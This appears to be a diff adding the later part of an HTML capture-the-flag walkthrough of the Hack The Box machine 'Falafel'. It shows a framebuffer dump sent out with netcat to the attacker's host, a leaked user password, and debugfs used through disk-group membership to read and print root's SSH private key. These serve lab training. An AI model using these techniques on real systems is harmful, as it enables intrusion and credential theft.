+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>dri<span style="color:#ff9d00;font-weight:700">/</span>renderD128<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>dri<span style="color:#ff9d00;font-weight:700">/</span>controlD64
+            </div>
+        </div><br>
+        <br>
+        <code>/dev/fb0</code> is interesting.<br>
+        <code>/dev/fb0</code> is the linux framebuffer, which can be used to capture screenshots.<br>
+            <div class="codebox">
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>fb0<br>
+                crw-rw----&nbsp;1&nbsp;root&nbsp;video&nbsp;29,&nbsp;0&nbsp;Nov&nbsp;&nbsp;6&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>fb0
+            </div>
+        </div><br>
+        <br>
+        Download the file to your attacking system with netcat.<br>
+        I used <code>md5sum</code> to make sure the files are the same.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9002&nbsp;&gt;&nbsp;fb0</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>fb0&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>fb0<br>
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;md5sum&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>fb0<br>
+                4033cf9f028acf4e64cde81e81258b41&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>fb0<br>
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;nc&nbsp;10.10.14.7&nbsp;9002&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>fb0
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.73]&nbsp;43516<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#md5sum&nbsp;fb0&nbsp;</span><br>
+                4033cf9f028acf4e64cde81e81258b41&nbsp;&nbsp;fb0
+            </div>
+        </div><br>
+        <br>
+        To convert the raw framebuffer data to a file, we need the image resolution.<br>
+            <div class="codebox">
+                moshe@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/groups</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>sys<span style="color:#ff9d00;font-weight:700">/</span>class<span style="color:#ff9d00;font-weight:700">/</span>graphics<span style="color:#ff9d00;font-weight:700">/</span>fb0<span style="color:#ff9d00;font-weight:700">/</span>virtual_size<br>
+                1176,885
+            </div>
+        </div><br>
+        <br>
+        Open the framebuffer as <code>Raw image data</code> with GIMP.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        Input the resolution, and change the image type to RGB5565, and you'll see a screenshot of yossi's terminal!<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        Looks like yossi used the <code>passwd</code> comamd incorrectly and leaked their password to us.<br>
+        <code>MoshePlzStopHackingMe!</code><br>
+        <br>
+        SSH in as <code>yossi</code> to Falafel.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;yossi@falafel.htb</span><br>
+                [...]<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                yossi
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) debugfs /dev/sda1</strong></h2><br>
+        Check what groups <code>yossi</code> is part of.<br>
+            <div class="codebox">
+                yossi@falafel<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span><br>
+                yossi&nbsp;adm&nbsp;disk&nbsp;cdrom&nbsp;dip&nbsp;plugdev&nbsp;lpadmin&nbsp;sambashare
+            </div>
+        </div><br>
+        <br>
+        <code>yossi</code> is part of the disk group, which means that they can read the mounted disks on teh system.<br>
+        Check the mounted drives on the system with <code>blkid</code><br>
+            <div class="codebox">
+                yossi@falafel<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;blkid<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>sda1<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UUID=<span style="color:#3ad900;font-weight:400">"ccba94d2-0b82-49ce-b25d-f1d3615345f0"</span>&nbsp;TYPE=<span style="color:#3ad900;font-weight:400">"ext4"</span>&nbsp;PARTUUID=<span style="color:#3ad900;font-weight:400">"01590ad6-01"</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>sda5<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UUID=<span style="color:#3ad900;font-weight:400">"63f5a640-a3f7-4ea9-9dbd-c9a091ace20c"</span>&nbsp;TYPE=<span style="color:#3ad900;font-weight:400">"swap"</span>&nbsp;PARTUUID=<span style="color:#3ad900;font-weight:400">"01590ad6-05"</span>
+            </div>
+        </div><br>
+        <br>
+        We can read <code>/dev/sda1</code>, where the OS is installed, with <code>debugfs</code>.<br>
+        We can read <code>/root</code>, and grab root's ssh private key - <code>id_rsa</code>.<br>
+            <div class="codebox">
+                yossi@falafel<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;debugfs&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>sda1<br>
+                debugfs&nbsp;1.42.13&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>17-May-2015<span style="color:#ff9d00;font-weight:700">)</span><br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                <br>
+                &nbsp;2&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;11&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>20<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;lost+found&nbsp;&nbsp;&nbsp;&nbsp;131073&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;etc&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262145&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;media&nbsp;&nbsp;&nbsp;&nbsp;131075&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;bin&nbsp;&nbsp;&nbsp;&nbsp;262146&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;boot&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262147&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;dev&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;home&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;lib&nbsp;&nbsp;&nbsp;&nbsp;262236&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;lib64&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262238&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;mnt&nbsp;&nbsp;&nbsp;&nbsp;262239&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;opt&nbsp;&nbsp;&nbsp;&nbsp;262240&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;proc&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262241&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;262244&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run&nbsp;&nbsp;&nbsp;&nbsp;262257&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;sbin&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262370&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;srv&nbsp;&nbsp;&nbsp;&nbsp;262371&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;sys&nbsp;&nbsp;&nbsp;&nbsp;262372&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;tmp&nbsp;&nbsp;&nbsp;&nbsp;262373&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;usr&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;131762&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;var&nbsp;&nbsp;&nbsp;&nbsp;24441&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>20<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;initrd.img&nbsp;&nbsp;&nbsp;&nbsp;24442&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>40<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;vmlinuz&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;145141&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;snap&nbsp;&nbsp;&nbsp;&nbsp;44536&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>24<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;initrd.img.old&nbsp;&nbsp;&nbsp;&nbsp;15692&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>3720<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;vmlinuz.old&nbsp;<br>
+                &nbsp;<br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;root<br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                <br>
+                &nbsp;262241&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;262242&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.bashrc&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;262243&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.profile&nbsp;&nbsp;&nbsp;&nbsp;295046&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.cache&nbsp;&nbsp;&nbsp;&nbsp;289943&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;root.txt&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;269128&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.nano&nbsp;&nbsp;&nbsp;&nbsp;402797&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.ssh&nbsp;&nbsp;&nbsp;&nbsp;269130&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>52<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.wget-hsts&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;269127&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>3928<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;.bash_history<br>
+                <br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.ssh<br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                <br>
+                &nbsp;402797&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;262241&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;402812&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>16<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;id_rsa&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;402822&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>40<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;id_rsa.pub&nbsp;&nbsp;&nbsp;&nbsp;402824&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>4016<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;authorized_keys<br>
+                &nbsp;<br>
+                debugfs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;id_rsa<br>
+                -----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                MIIEpAIBAAKCAQEAyPdlQuyVr<span style="color:#ff9d00;font-weight:700">/</span>L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h<br>
+                b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx<span style="color:#ff9d00;font-weight:700">/</span>gf<br>
+                v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg<br>
+                BWQ5RfpdFDWvIexRDfwj<span style="color:#ff9d00;font-weight:700">/</span>Dx+tiIPGcYtkpQ<span style="color:#ff9d00;font-weight:700">/</span>UihaDgF0gwj912Zc1N5+0sILX<span style="color:#ff9d00;font-weight:700">/</span>Qd<br>
+                UQ+ZywP<span style="color:#ff9d00;font-weight:700">/</span>qj1FI+ki<span style="color:#ff9d00;font-weight:700">/</span>kJcYsW<span style="color:#ff9d00;font-weight:700">/</span>5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b<span style="color:#ff9d00;font-weight:700">/</span>ZV<br>
+                dmoHaOx<span style="color:#ff9d00;font-weight:700">/</span>UOrNywkp486<span style="color:#ff9d00;font-weight:700">/</span>SQtn30Er7SlM29<span style="color:#ff9d00;font-weight:700">/</span>8PQIDAQABAoIBAQCGd5qmw<span style="color:#ff9d00;font-weight:700">/</span>yIZU<span style="color:#ff9d00;font-weight:700">/</span>1<br>
+                eWSOpj6VHmee5q2tnhuVffmVgS7S<span style="color:#ff9d00;font-weight:700">/</span>d8UHH3yDLcrseQhmBdGey+qa7fu<span style="color:#ff9d00;font-weight:700">/</span>ypqCy2n<br>
+                gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal<span style="color:#ff9d00;font-weight:700">/</span>rvnxM4OqJ0ChK7TUnBhV<br>
+                +7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu<span style="color:#ff9d00;font-weight:700">/</span>ghav8Iqps<span style="color:#ff9d00;font-weight:700">/</span>tuZ0<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td<br>
+                OnO+rf<span style="color:#ff9d00;font-weight:700">/</span>vtYg+RQC+Y7zUpyLONYP+9S6WvJ<span style="color:#ff9d00;font-weight:700">/</span>lqszXrYKRtlQg+8Pf7yhcOz<span style="color:#ff9d00;font-weight:700">/</span>n7G08<br>
+                kta<span style="color:#ff9d00;font-weight:700">/</span>3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx<span style="color:#ff9d00;font-weight:700">/</span>c3DU+yi+6hDnV1KMTe3zK<span style="color:#ff9d00;font-weight:700">/</span>yjG<br>
+                UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG<br>
+                ahkTSKUnpk2<span style="color:#ff9d00;font-weight:700">/</span>EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0<br>
+                GcJ34ozu<span style="color:#ff9d00;font-weight:700">/</span>XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr<br>
+                5SmT+XoWQtK9dSHVNXr4XWRaH6aow<span style="color:#ff9d00;font-weight:700">/</span>oazY05W<span style="color:#ff9d00;font-weight:700">/</span>BgXRMxolVSHdNE23xuX9dlwMPB<br>
+                f<span style="color:#ff9d00;font-weight:700">/</span>y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd<span style="color:#ff9d00;font-weight:700">/</span>8lAkcY2ZxIva<br>
+                xsUr+PWo4O<span style="color:#ff9d00;font-weight:700">/</span>O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc<br>
+                HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9<br>
+                BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs<span style="color:#ff9d00;font-weight:700">/</span>IXFoHM3ywblZiZlUcmFegVOYrSmk<span style="color:#ff9d00;font-weight:700">/</span><br>
+                k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem<span style="color:#ff9d00;font-weight:700">/</span>UPdEz<br>
+                HW1BZbXJSDY1L3ZiAmUPgFfgDSze<span style="color:#ff9d00;font-weight:700">/</span>mcOIoEK8AuCU<span style="color:#ff9d00;font-weight:700">/</span>ejFpIgJsNmJEfCQKfbwp2a<br>
+                M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP<br>
+                NZTQDYCA31J<span style="color:#ff9d00;font-weight:700">/</span>gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ<br>
+                FEUbkAlzcvN<span style="color:#ff9d00;font-weight:700">/</span>S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==<br>
+                -----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----
+            </div>
+        </div><br>
+        <br>
+        Copy the private key to a file, change its permissions to 600, and login as <code>root</code>!<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;id_rsa.root</span><br>
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#chmod&nbsp;600&nbsp;id_rsa.root&nbsp;</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;root@falafel.htb&nbsp;-i&nbsp;id_rsa.root&nbsp;</span><br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.3&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.4.0-112-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                <br>
+                0&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+                0&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+                <br>
+                <br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Tue&nbsp;May&nbsp;&nbsp;1&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;2018&nbsp;from&nbsp;10.10.14.4<br>
+                root@falafel<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>root.txt<br>
+                23b792004...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
